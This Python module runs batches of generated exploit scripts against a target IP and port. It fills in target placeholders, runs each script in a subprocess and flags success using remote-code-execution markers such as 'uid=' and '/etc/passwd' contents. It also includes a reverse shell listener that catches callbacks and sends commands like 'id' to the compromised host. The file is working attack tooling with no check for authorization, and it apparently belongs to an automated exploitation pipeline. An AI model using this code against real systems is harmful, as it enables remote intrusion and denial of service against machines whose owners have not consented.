"""
Exploit Executor Module
Safely executes generated exploits against target systems.

Features:
- Placeholder replacement for target IP/port
- Subprocess isolation with timeout
- Output capture and RCE detection
- Reverse shell listener support
"""

import os
import sys
import subprocess
import re
import socket
import threading
import time
import logging
import ast
from typing import Dict, Any, Optional, Tuple, List
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class ExploitResult:
    """Result of exploit execution."""
    success: bool
    rce_detected: bool
    dos_detected: bool
    output: str
    error: str
    exit_code: int
    execution_time: float
    payload_that_worked: Optional[str] = None


class ReverseShellListener:
    """
    Simple reverse shell listener for catching callbacks.
    
    Usage:
        listener = ReverseShellListener(port=4444)
        listener.start()
        # ... send reverse shell payload ...
        if listener.wait_for_connection(timeout=30):
            listener.interact()  # or listener.execute("id")
    """
    
    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connection = None
        self.client_address = None
        self.running = False
        self._thread = None
        
    def start(self):
        """Start the listener in a background thread."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.settimeout(60)  # 60 second timeout for accept
        
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            self.running = True
            logger.info(f"[LISTENER] Started on {self.host}:{self.port}")
            
            self._thread = threading.Thread(target=self._accept_loop, daemon=True)
            self._thread.start()
            return True
        except Exception as e:
            logger.error(f"[LISTENER] Failed to start: {e}")
            return False
    
    def _accept_loop(self):
        """Accept incoming connections."""
        try:
            self.connection, self.client_address = self.socket.accept()
            logger.critical(f"[LISTENER] *** SHELL RECEIVED from {self.client_address} ***")
        except socket.timeout:
            logger.warning("[LISTENER] Timeout waiting for connection")
        except Exception as e:
            if self.running:
                logger.error(f"[LISTENER] Error: {e}")
    
    def wait_for_connection(self, timeout: float = 30) -> bool:
        """Wait for a connection to arrive."""
        start = time.time()
        while time.time() - start < timeout:
            if self.connection:
                return True
            time.sleep(0.5)
        return False
    
    def execute(self, command: str) -> str:
        """Execute a command on the connected shell."""
        if not self.connection:
            return "[ERROR] No connection"
        
        try:
            self.connection.send(f"{command}\n".encode())
            time.sleep(0.5)  # Wait for output
            self.connection.setblocking(False)
            output = b""
            try:
                while True:
                    chunk = self.connection.recv(4096)
                    if not chunk:
                        break
                    output += chunk
            except BlockingIOError:
                pass
            self.connection.setblocking(True)
            return output.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"[ERROR] {e}"
    
    def stop(self):
        """Stop the listener."""
        self.running = False
        if self.connection:
            self.connection.close()
        if self.socket:
            self.socket.close()
        logger.info("[LISTENER] Stopped")


class ExploitExecutor:
    """
    Executes generated exploit scripts safely.
    
    Features:
    - Validates Python syntax before execution
    - Replaces placeholders ({your_target_ip}, etc.)
    - Runs in isolated subprocess with timeout
    - Captures output for RCE/DoS detection
    - Optional reverse shell listener integration
    """
    
    # Patterns that indicate successful RCE or exploitation
    RCE_INDICATORS = [
        # Shell/Command execution
        r'uid=\d+',           # Unix id output
        r'root:x:0:0',        # /etc/passwd content
        r'Linux \w+',         # uname output
        r'Windows NT',        # Windows version
        r'SHELL=',            # Environment variable
        r'PATH=/',            # Environment variable
        r'whoami:',           # whoami output
        r'\$ $',              # Shell prompt
        r'# $',               # Root shell prompt
        
        # Web exploit success patterns  
        r'SUCCESS',           # Generic success
        r'SUCCESSFUL',        # Generic success
        r'\[\+\]',            # [+] indicator
        r'Files Read:',       # File reading success
        r'Total Bytes:',      # Data extracted
        r'Extracted Files:',  # File extraction
        r'Content Preview:',  # Content read
        r'WEB-INF/web\.xml',  # Sensitive file access
        r'application\.properties',  # Config file
        r'SQL Injection',     # SQLi success
        r'RCE confirmed',     # RCE confirmation
        r'Command executed',  # Command success
        r'EXPLOITATION SUCCESSFUL', # Our template pattern
        r'Success: True',     # Our summary pattern
    ]

    
    # Patterns that indicate DoS
    DOS_INDICATORS = [
        r'Connection refused',
        r'Connection timed out',
        r'Connection reset',
        r'No route to host',
    ]
    
    def __init__(self, timeout: int = 30, use_listener: bool = False, listener_port: int = 4444):
        self.timeout = timeout
        self.use_listener = use_listener
        self.listener_port = listener_port
        self.listener = None
        
    def validate_exploit(self, exploit_path: str) -> Tuple[bool, str]:
        """
        Validate that the exploit file is valid Python.
        
        Returns:
            Tuple of (is_valid, error_message)
        """
        try:
            with open(exploit_path, 'r', encoding='utf-8') as f:
                code = f.read()
            
            ast.parse(code)
            
            # Check for basic exploit structure
            if 'import' not in code:
                return False, "Missing imports"
            
            return True, ""
        except SyntaxError as e:
            return False, f"Syntax error: {e}"
        except Exception as e:
            return False, f"Validation error: {e}"
    
    def prepare_exploit(self, exploit_path: str, target_ip: str, target_port: int) -> str:
        """
        Prepare exploit for execution by replacing placeholders.
        
        Args:
            exploit_path: Path to the exploit file
            target_ip: Target IP address
            target_port: Target port
            
        Returns:
            Path to the prepared exploit file
        """
        with open(exploit_path, 'r', encoding='utf-8') as f:
            code = f.read()
        
        # Replace common placeholders
        replacements = {
            '{your_target_ip}': target_ip,
            '{target_ip}': target_ip,
            '{TARGET_IP}': target_ip,
            'your_target_ip': f'"{target_ip}"',
            'target_ip_here': target_ip,
            '{port}': str(target_port),
            '{target_port}': str(target_port),
            # Template placeholders used in our exploit templates
            '__TARGET_PLACEHOLDER__': f'http://{target_ip}:{target_port}',
            '__TARGET_IP_PLACEHOLDER__': target_ip,
            # NOTE: Removed ':80' replacement as it corrupts existing ports like :8080 â†’ :80808080
        }
        
        for placeholder, value in replacements.items():
            code = code.replace(placeholder, value)
        
        # Replace :80 ONLY when it's a complete port (followed by / or end of string or whitespace)
        # This prevents :8080 from becoming :80808080
        code = re.sub(r':80(?=/|\s|"|\'|$)', f':{target_port}', code)
        
        # Also handle f-string patterns like {remote_host}
        code = re.sub(r'\{remote_host\}', target_ip, code)
        code = re.sub(r'\{remote_port\}', str(target_port), code)
        
        # Check if any replacements were made - if not, skip writing
        with open(exploit_path, 'r', encoding='utf-8') as f:
            original = f.read()
        if code == original:
            # No changes needed, use original
            logger.info(f"[EXECUTOR] No placeholders to replace, using original")
            return exploit_path
        
        # Write to a temp prepared file - use absolute path
        prepared_path = os.path.abspath(exploit_path.replace('.py', '_prepared.py'))
        with open(prepared_path, 'w', encoding='utf-8') as f:
            f.write(code)
        
        logger.info(f"[EXECUTOR] Prepared exploit: {prepared_path}")
        return prepared_path
    
    def execute_exploit(self, exploit_path: str, target_ip: str = None, target_port: int = None) -> ExploitResult:
        """
        Execute an exploit script.
        
        Args:
            exploit_path: Path to the exploit file
            target_ip: Target IP (if placeholders need replacement)
            target_port: Target port
            
        Returns:
            ExploitResult with execution details
        """
        start_time = time.time()
        
        # Validate first
        is_valid, error = self.validate_exploit(exploit_path)
        if not is_valid:
            return ExploitResult(
                success=False,
                rce_detected=False,
                dos_detected=False,
                output="",
                error=f"Validation failed: {error}",
                exit_code=-1,
                execution_time=0
            )
        
        # Prepare if target is provided
        exec_path = exploit_path
        if target_ip and target_port:
            exec_path = self.prepare_exploit(exploit_path, target_ip, target_port)
        
        # Start reverse shell listener if enabled
        if self.use_listener:
            self.listener = ReverseShellListener(port=self.listener_port)
            self.listener.start()
        
        # Execute in subprocess
        try:
            # Convert to absolute path to avoid path duplication issues
            exec_path = os.path.abspath(exec_path)
            logger.info(f"[EXECUTOR] Running: {exec_path}")
            
            result = subprocess.run(
                [sys.executable, exec_path],
                capture_output=True,
                text=True,
                timeout=self.timeout,
                cwd=os.path.dirname(exec_path)  # Use absolute path's directory
            )
            
            execution_time = time.time() - start_time
            
            # Analyze output
            output = result.stdout
            error = result.stderr
            combined = output + error
            
            rce_detected = self._detect_rce(combined)
            dos_detected = self._detect_dos(combined)
            
            # Check if listener got a connection
            if self.use_listener and self.listener:
                if self.listener.wait_for_connection(timeout=5):
                    logger.critical("[EXECUTOR] *** REVERSE SHELL CONNECTED ***")
                    rce_detected = True
                    # Execute verification command
                    id_output = self.listener.execute("id")
                    output += f"\n[SHELL] {id_output}"
                self.listener.stop()
            
            success = result.returncode == 0 or rce_detected
            
            return ExploitResult(
                success=success,
                rce_detected=rce_detected,
                dos_detected=dos_detected,
                output=output,
                error=error,
                exit_code=result.returncode,
                execution_time=execution_time
            )
            
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            logger.warning(f"[EXECUTOR] Timeout after {self.timeout}s")
            
            # Timeout could indicate DoS
            return ExploitResult(
                success=False,
                rce_detected=False,
                dos_detected=True,  # Timeout might mean we caused DoS
                output="",
                error=f"Execution timeout after {self.timeout}s",
                exit_code=-1,
                execution_time=execution_time
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            logger.error(f"[EXECUTOR] Error: {e}")
            
            return ExploitResult(
                success=False,
                rce_detected=False,
                dos_detected=False,
                output="",
                error=str(e),
                exit_code=-1,
                execution_time=execution_time
            )
        finally:
            # Cleanup listener
            if self.listener:
                self.listener.stop()
    
    def _detect_rce(self, output: str) -> bool:
        """Detect RCE indicators in output."""
        for pattern in self.RCE_INDICATORS:
            if re.search(pattern, output, re.IGNORECASE):
                logger.critical(f"[EXECUTOR] RCE DETECTED! Pattern: {pattern}")
                return True
        return False
    
    def _detect_dos(self, output: str) -> bool:
        """Detect DoS indicators in output."""
        for pattern in self.DOS_INDICATORS:
            if re.search(pattern, output, re.IGNORECASE):
                return True
        return False
    
    def execute_all(self, exploit_dir: str, target_ip: str, target_port: int) -> List[ExploitResult]:
        """
        Execute all exploits in a directory.
        
        Args:
            exploit_dir: Directory containing exploit files
            target_ip: Target IP address
            target_port: Target port
            
        Returns:
            List of ExploitResult for each exploit
        """
        import glob
        
        results = []
        exploit_files = glob.glob(os.path.join(exploit_dir, "exploit_*.py"))
        
        logger.info(f"[EXECUTOR] Found {len(exploit_files)} exploits to execute")
        
        for exploit_file in exploit_files:
            # Skip prepared files
            if "_prepared.py" in exploit_file:
                continue
                
            logger.info(f"[EXECUTOR] Executing: {os.path.basename(exploit_file)}")
            result = self.execute_exploit(exploit_file, target_ip, target_port)
            results.append(result)
            
            if result.rce_detected:
                logger.critical(f"[EXECUTOR] *** RCE SUCCESSFUL: {exploit_file} ***")
            elif result.dos_detected:
                logger.warning(f"[EXECUTOR] DoS detected: {exploit_file}")
            elif result.success:
                logger.info(f"[EXECUTOR] Exploit ran successfully: {exploit_file}")
            else:
                logger.warning(f"[EXECUTOR] Exploit failed: {exploit_file}")
        
        return results


# Convenience function for quick execution
def execute_exploit(exploit_path: str, target_ip: str, target_port: int, timeout: int = 30) -> ExploitResult:
    """Quick function to execute a single exploit."""
    executor = ExploitExecutor(timeout=timeout)
    return executor.execute_exploit(exploit_path, target_ip, target_port)


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Execute exploits against a target")
    parser.add_argument("exploit", help="Path to exploit file or directory")
    parser.add_argument("--target-ip", "-t", required=True, help="Target IP address")
    parser.add_argument("--target-port", "-p", type=int, default=8080, help="Target port")
    parser.add_argument("--timeout", type=int, default=30, help="Execution timeout")
    parser.add_argument("--listener", action="store_true", help="Start reverse shell listener")
    parser.add_argument("--listener-port", type=int, default=4444, help="Listener port")
    
    args = parser.parse_args()
    
    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
    
    executor = ExploitExecutor(
        timeout=args.timeout,
        use_listener=args.listener,
        listener_port=args.listener_port
    )
    
    if os.path.isdir(args.exploit):
        results = executor.execute_all(args.exploit, args.target_ip, args.target_port)
        print(f"\n{'='*50}")
        print(f"Executed {len(results)} exploits")
        print(f"RCE: {sum(1 for r in results if r.rce_detected)}")
        print(f"DoS: {sum(1 for r in results if r.dos_detected)}")
        print(f"Success: {sum(1 for r in results if r.success)}")
    else:
        result = executor.execute_exploit(args.exploit, args.target_ip, args.target_port)
        print(f"\n{'='*50}")
        print(f"Success: {result.success}")
        print(f"RCE: {result.rce_detected}")
        print(f"DoS: {result.dos_detected}")
        print(f"Exit Code: {result.exit_code}")
        print(f"Time: {result.execution_time:.2f}s")
        if result.output:
            print(f"\nOutput:\n{result.output[:500]}")
        if result.error:
            print(f"\nError:\n{result.error[:500]}")
